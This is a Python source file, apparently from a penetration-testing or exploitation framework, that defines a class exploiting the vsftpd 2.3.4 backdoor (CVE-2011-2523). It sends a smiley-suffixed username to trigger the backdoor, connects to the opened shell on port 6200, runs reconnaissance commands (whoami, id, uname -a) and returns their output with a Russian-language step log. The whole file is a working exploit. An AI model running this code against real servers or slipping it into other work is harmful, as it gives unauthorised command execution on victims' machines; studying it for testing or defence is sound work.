from project.workers.application.exploit.base import BaseExploit
from project.workers.application.exploit.consts import Exploit
from telnetlib import Telnet


class VsftpdExploit(BaseExploit):
    name = Exploit.CVE_2011_2523.value

    USER = "USER nergal:)"
    PASSWORD = "PASS pass"
    COMMANDS = ["whoami", "id", "uname -a"]

    def run(self, **kwargs):
        print(f"{kwargs=}")
        host = kwargs.get("host", "127.0.0.1")
        ftp_port = int(kwargs.get("port", 21))

        several_ftp_port = int(kwargs.get("several_ftp_port", 6200))
        print(f"{host=} {ftp_port=} {several_ftp_port=}")
        ftp_tn = Telnet(host, ftp_port)
        ftp_tn.read_until(b"(vsFTPd 2.3.4)")
        ftp_tn.write(self.USER.encode("ascii") + b"\n")
        ftp_tn.read_until(b"password.")
        ftp_tn.write(self.PASSWORD.encode("ascii") + b"\n")
        ftp_tn.close()
        several_ftp_tn = Telnet(host, several_ftp_port)

        messages = []
        for command in self.COMMANDS:
            several_ftp_tn.write(command.encode("ascii") + b"\n")
            read_bytes = several_ftp_tn.read_some()
            messages.append(
                {
                    "command": command,
                    "message": read_bytes.decode("utf-8").strip()
                }
            )

        return {
            "host": host,
            "port": ftp_port,
            "messages": messages,
            "flow": [
                f"Подключение через telnet к {host}:{ftp_port}",
                f"Попытка авторизации с помощью фейковых данных '{self.USER}':'{self.PASSWORD}'",
                f"Подключение к служебному адресу FTP {host}:{several_ftp_port}",
                f"Принудительный обрыв соединения с {host}:{ftp_port}",
                f"Попытка исполнения команд {self.COMMANDS}",
                f"Получение результатов"
            ],
            "name": self.name
        }



